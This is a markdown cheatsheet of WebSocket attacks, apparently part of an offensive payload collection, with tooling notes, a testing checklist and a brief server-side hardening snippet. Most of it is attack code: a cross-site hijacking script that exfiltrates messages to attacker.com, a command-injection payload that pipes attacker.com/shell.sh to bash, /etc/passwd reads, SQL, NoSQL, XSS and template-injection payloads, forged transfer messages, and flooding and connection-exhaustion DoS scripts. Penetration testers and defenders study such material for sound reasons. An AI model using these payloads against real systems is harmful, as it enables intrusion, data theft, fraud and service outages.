# 🔌 WebSocket Attacks Cheatsheet

```
██╗    ██╗███████╗██████╗ ███████╗ ██████╗  ██████╗██╗  ██╗███████╗████████╗
██║    ██║██╔════╝██╔══██╗██╔════╝██╔═══██╗██╔════╝██║ ██╔╝██╔════╝╚══██╔══╝
██║ █╗ ██║█████╗  ██████╔╝███████╗██║   ██║██║     █████╔╝ █████╗     ██║   
██║███╗██║██╔══╝  ██╔══██╗╚════██║██║   ██║██║     ██╔═██╗ ██╔══╝     ██║   
╚███╔███╔╝███████╗██████╔╝███████║╚██████╔╝╚██████╗██║  ██╗███████╗   ██║   
 ╚══╝╚══╝ ╚══════╝╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝   
 █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗███████╗                   
██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝██╔════╝                   
███████║   ██║      ██║   ███████║██║     █████╔╝ ███████╗                   
██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ ╚════██║                   
██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗███████║                   
╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝                   
```

---

## 🔍 WebSocket Basics

### Handshake Request
```http
GET /chat HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://target.com
```

### Handshake Response
```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

### Detection
```
- ws:// (unencrypted)
- wss:// (TLS encrypted)
- Upgrade: websocket header
- Network tab shows "101 Switching Protocols"
```

---

## 🎯 WebSocket Vulnerabilities

### 1. Cross-Site WebSocket Hijacking (CSWSH)

**Vulnerable Condition:** Server doesn't validate Origin header

```html
<!-- Attacker's page -->
<script>
  var ws = new WebSocket('wss://target.com/chat');
  
  ws.onopen = function() {
    // Connection opened, attacker can send messages
    ws.send('{"action": "get_messages"}');
  };
  
  ws.onmessage = function(event) {
    // Steal data and send to attacker
    fetch('https://attacker.com/steal?data=' + btoa(event.data));
  };
</script>
```

**CSRF-style Attack:**
```html
<script>
  var ws = new WebSocket('wss://target.com/api');
  ws.onopen = function() {
    // Perform actions as victim
    ws.send('{"action": "transfer", "to": "attacker", "amount": 1000}');
  };
</script>
```

---

### 2. Missing Origin Validation

**Testing:**
```bash
# Using wscat
wscat -c wss://target.com/ws -H "Origin: https://evil.com"

# Using websocat
websocat -H "Origin: https://evil.com" wss://target.com/ws
```

**Exploitation:**
```javascript
// If server accepts any origin
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = () => ws.send('{"action": "sensitive_operation"}');
```

---

### 3. Authentication Bypass

**No Auth on WS Connection:**
```javascript
// Connect without cookies/tokens
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = () => {
  ws.send('{"action": "list_users"}');  // No auth required?
};
```

**Token in URL (Leakage Risk):**
```
wss://target.com/ws?token=SECRET_TOKEN
// Token may leak in logs, referrer headers
```

**Testing Different Auth States:**
```javascript
// Test with expired token
// Test with modified token
// Test with no token
// Test with another user's token
```

---

### 4. Injection Attacks via WebSocket

**XSS via WebSocket:**
```javascript
// Send XSS payload
ws.send('{"message": "<script>alert(document.cookie)</script>"}');
ws.send('{"message": "<img src=x onerror=alert(1)>"}');
```

**SQL Injection:**
```javascript
ws.send('{"query": "\' OR 1=1--"}');
ws.send('{"id": "1 UNION SELECT username,password FROM users--"}');
```

**Command Injection:**
```javascript
ws.send('{"cmd": "ping 127.0.0.1; id"}');
ws.send('{"file": "test.txt; cat /etc/passwd"}');
```

**NoSQL Injection:**
```javascript
ws.send('{"username": {"$ne": ""}, "password": {"$ne": ""}}');
```

---

### 5. DoS Attacks

**Message Flooding:**
```javascript
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() {
  setInterval(() => {
    ws.send('x'.repeat(10000));  // Large messages
  }, 1);
};
```

**Connection Exhaustion:**
```python
import websocket
import threading

def connect():
    ws = websocket.WebSocket()
    ws.connect("wss://target.com/ws")
    while True:
        pass  # Keep connection open

for i in range(1000):
    threading.Thread(target=connect).start()
```

---

### 6. Data Manipulation

**Message Tampering:**
```javascript
// Intercept and modify messages
// Using Burp Suite WebSocket interception

// Original
{"action": "transfer", "amount": 10, "to": "user123"}

// Modified
{"action": "transfer", "amount": 10000, "to": "attacker"}
```

**Race Conditions:**
```javascript
// Send multiple rapid requests
for(let i = 0; i < 100; i++) {
  ws.send('{"action": "claim_bonus"}');
}
```

---

## 🛠️ Testing Tools

### Burp Suite
```
1. Proxy → WebSockets history
2. Right-click → Send to Repeater
3. Modify and resend messages
4. Check "Auto-scroll to end"
```

### wscat (CLI)
```bash
# Install
npm install -g wscat

# Connect
wscat -c wss://target.com/ws

# With headers
wscat -c wss://target.com/ws -H "Cookie: session=abc123"
wscat -c wss://target.com/ws -H "Authorization: Bearer TOKEN"

# With origin
wscat -c wss://target.com/ws -o "https://target.com"
```

### websocat
```bash
# Install
cargo install websocat

# Connect
websocat wss://target.com/ws

# With headers
websocat -H "Origin: https://evil.com" wss://target.com/ws
websocat -H "Cookie: session=abc" wss://target.com/ws
```

### Python Testing Script
```python
import websocket
import json

def on_message(ws, message):
    print(f"Received: {message}")

def on_open(ws):
    # Test payloads
    ws.send('{"action": "test"}')
    ws.send('{"action": "get_users", "id": "1 OR 1=1"}')

ws = websocket.WebSocketApp(
    "wss://target.com/ws",
    header={"Origin": "https://evil.com"},
    cookie="session=abc123",
    on_message=on_message,
    on_open=on_open
)
ws.run_forever()
```

### Browser DevTools
```javascript
// Monitor WebSocket traffic
// F12 → Network → WS filter

// Manual testing
var ws = new WebSocket('wss://target.com/ws');
ws.onmessage = (e) => console.log('Received:', e.data);
ws.onopen = () => ws.send('test');
```

---

## 💉 Payload Collection

### Authentication Testing
```json
// No auth
{"action": "get_secret_data"}

// Empty token
{"token": "", "action": "admin_action"}

// Null token
{"token": null, "action": "delete_user"}
```

### XSS Payloads
```json
{"message": "<script>alert('XSS')</script>"}
{"message": "<img src=x onerror=alert(1)>"}
{"name": "<svg onload=alert(1)>"}
{"data": "'-alert(1)-'"}
```

### SQLi Payloads
```json
{"id": "1' OR '1'='1"}
{"user": "admin'--"}
{"search": "1 UNION SELECT password FROM users--"}
{"filter": "1; DROP TABLE users--"}
```

### Command Injection
```json
{"host": "localhost; id"}
{"file": "test.txt | cat /etc/passwd"}
{"cmd": "`whoami`"}
{"input": "$(curl attacker.com/shell.sh | bash)"}
```

### Path Traversal
```json
{"file": "../../../etc/passwd"}
{"path": "....//....//etc/passwd"}
{"template": "{{constructor.constructor('return this')().process.mainModule.require('child_process').execSync('id')}}"}
```

---

## 📋 Testing Checklist

```markdown
## WebSocket Security Checklist

□ Identify WebSocket endpoints
□ Check Origin header validation
□ Test CSWSH (Cross-Site WebSocket Hijacking)
□ Test authentication requirements
□ Check if tokens are passed securely
□ Test for injection vulnerabilities (XSS, SQLi, etc.)
□ Test authorization (access other users' data)
□ Check for rate limiting
□ Test message size limits
□ Look for sensitive data exposure
□ Test connection handling (reconnection)
□ Check encryption (wss:// vs ws://)
```

---

## 🔐 Secure Implementation

```javascript
// Server-side Origin validation
if (request.headers.origin !== 'https://trusted-site.com') {
  socket.close(1008, 'Invalid origin');
  return;
}

// Token-based authentication
socket.on('connection', function(ws, req) {
  const token = req.url.split('token=')[1];
  if (!validateToken(token)) {
    ws.close(1008, 'Invalid token');
  }
});

// Input validation
socket.on('message', function(data) {
  const parsed = JSON.parse(data);
  if (!isValidInput(parsed)) {
    socket.send(JSON.stringify({error: 'Invalid input'}));
    return;
  }
});
```

---

## 🔗 Related Payloads

- [XSS Payloads](./XSS.md)
- [SQLi Payloads](./SQLi.md)
- [Command Injection](./Command-Injection.md)

---

**Back to Payloads:** [💉 Payloads Collection](./README.md)
